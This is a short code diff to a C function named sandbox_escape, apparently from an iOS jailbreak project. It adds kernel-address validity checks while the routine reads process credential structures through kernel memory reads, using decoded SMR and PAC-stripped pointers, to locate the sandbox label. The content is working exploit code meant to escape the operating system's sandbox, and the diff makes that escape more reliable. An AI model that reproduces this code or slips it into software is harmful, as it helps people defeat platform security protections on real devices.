@@ -143,7 +143,7 @@ int sandbox_escape(uint64_t self_proc) {
         TweakLog("[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
 
         // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
-        if (ptr_in_kernel(smr)) {
+        if (ptr_in_kernel(smr) && is_kaddr_valid(smr)) {
             uint64_t maybe_label = S(early_kread64(smr + 0x78));
             if (ptr_in_kernel(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
@@ -155,7 +155,7 @@ int sandbox_escape(uint64_t self_proc) {
             }
         }
         // Also try PAC-stripped
-        if (!ucred && ptr_in_kernel(pac)) {
+        if (!ucred && ptr_in_kernel(pac) && is_kaddr_valid(pac)) {
             uint64_t maybe_label = S(early_kread64(pac + 0x78));
             if (ptr_in_kernel(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
